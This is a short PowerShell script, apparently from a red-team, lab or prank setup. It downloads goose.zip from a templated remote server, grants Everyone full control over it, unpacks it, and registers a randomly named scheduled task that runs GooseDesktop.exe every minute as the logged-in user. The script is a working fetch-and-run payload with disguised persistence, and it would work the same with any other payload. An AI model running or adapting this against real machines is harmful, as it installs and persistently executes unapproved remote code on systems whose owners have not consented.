$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri "http://${server_ip}:8000/goose.zip" -OutFile C:\goose.zip
icacls C:\goose.zip /grant 'Everyone:(OI)(CI)F' /T
Expand-Archive -Path C:\goose.zip -DestinationPath C:\goose -Force
schtasks /create /tn $(-join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})) /tr "C:\goose\goose\GooseDesktop.exe" /sc minute /mo 1 /st $(Get-Date).AddMinutes(1).ToString("HH:mm") /ru $(((quser | Select-Object -Skip 1 -First 1) -split "\s\s+")[0].TrimStart(' '))